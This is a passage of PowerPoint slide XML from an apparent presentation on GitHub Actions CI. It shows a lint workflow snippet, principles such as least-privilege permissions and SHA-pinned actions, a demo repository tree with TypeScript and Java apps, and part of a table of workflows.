              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: read</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steps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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/checkout@3d3c42e5…  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># v7.0.1</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with</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persist-credentials</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: false</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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: $/.github/actions/setup-ts</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run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: pnpm lint</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1554480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="1517904"/>
            <a:ext cx="3840480" cy="7772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Triggers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pull requests, pushes to main, reuse by deploy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="2404872"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="26AF72"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="2368296"/>
            <a:ext cx="3840480" cy="7772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Least privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No permissions by default; each job opts in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3255264"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A9BCD"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="3218688"/>
            <a:ext cx="3840480" cy="7772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Concurrency</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A new push cancels the outdated PR run</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4105656"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6E3CBE"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="4069080"/>
            <a:ext cx="3840480" cy="7772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Pinned actions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Full commit SHA + version comment, bumped by Dependabot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4956048"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="4919472"/>
            <a:ext cx="3840480" cy="7772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Steps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uses: a reusable action, run: a shell command</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The demo repository</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Two projects, six workflows, one policy file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Tree background"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="4206240" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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5" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1691640"/>
            <a:ext cx="3886200" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>github-actions-demo/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A9BCD"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>├─ ts-app/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>│   TypeScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>· pnpm · Vitest · Playwright</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F06400"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>├─ java-app/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>│   Java 21 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>· Maven · JUnit · Playwright</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E3CBE"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>└─ .github/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    ├─ workflows/   6 workflows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    ├─ actions/     composite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    ├─ scripts/     oss-report.mjs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    ├─ oss-policy.json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="282828"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>    └─ dependabot.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 6"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="261927910"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5074920" y="1508760"/>
          <a:ext cx="6565392" cy="4279392"/>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534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Workflow</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Trigger</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="125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50" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>What it does</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>ts-ci.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PR, push, call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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Format, lint, typecheck</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>, test, e2e, audit, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>build</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>java-ci.yml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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PR, push, call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50" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>The same checks for Java</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="534924">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
